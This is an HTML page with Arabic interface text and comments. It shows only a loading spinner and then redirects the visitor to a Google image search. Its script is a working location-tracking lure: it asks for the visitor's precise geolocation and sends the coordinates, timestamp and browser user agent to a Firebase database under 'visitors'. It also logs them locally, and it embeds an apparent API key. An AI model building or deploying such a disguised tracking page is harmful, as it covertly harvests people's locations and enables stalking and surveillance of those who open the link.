<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل...</title>
    <style>
        body {
            background: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
        }
        .loader { text-align: center; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #8ab4f8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .message { font-size: 14px; color: #aaa; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div class="message" id="status">جاري التجهيز...</div>
    </div>

    <script>
        // بيانات مشروعك - تم وضعها يدويًا
        const firebaseConfig = {
            apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
            databaseURL: "https://imggps-default-rtdb.firebaseio.com",
            projectId: "imggps"
        };

        const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
        const DB_PATH = "visitors";

        function redirect() {
            window.location.href = TARGET_URL;
        }

        function saveData(lat, lng, accuracy) {
            const record = {
                lat: lat,
                lng: lng,
                accuracy: accuracy,
                timestamp: Date.now(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            // نسخة احتياطية محلية
            try {
                const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                localData.push(record);
                localStorage.setItem('geo_log', JSON.stringify(localData));
            } catch(e) {}

            // إرسال إلى Firebase Realtime Database باستخدام REST API
            fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(record)
            })
            .then(() => console.log('تم الحفظ في السحابة'))
            .catch(err => console.warn('فشل الحفظ السحابي', err))
            .finally(() => {
                redirect();
            });
        }

        function handlePosition(pos) {
            const lat = pos.coords.latitude.toFixed(7);
            const lng = pos.coords.longitude.toFixed(7);
            const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : 'N/A';
            document.getElementById('status').textContent = 'تم تحديد الموقع...';
            saveData(lat, lng, acc);
        }

        function handleError(err) {
            console.warn('Geolocation error:', err.message);
            document.getElementById('status').textContent = 'لم نتمكن من تحديد الموقع...';
            setTimeout(redirect, 1500);
        }

        if (navigator.geolocation) {
            document.getElementById('status').textContent = 'جاري تحديد الموقع...';
            navigator.geolocation.getCurrentPosition(
                handlePosition,
                handleError,
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
        } else {
            setTimeout(redirect, 1000);
        }

        // احتياط: إعادة توجيه بعد 7 ثوانٍ إذا لم يكتمل شيء
        setTimeout(redirect, 7000);
    </script>
</body>
</html>
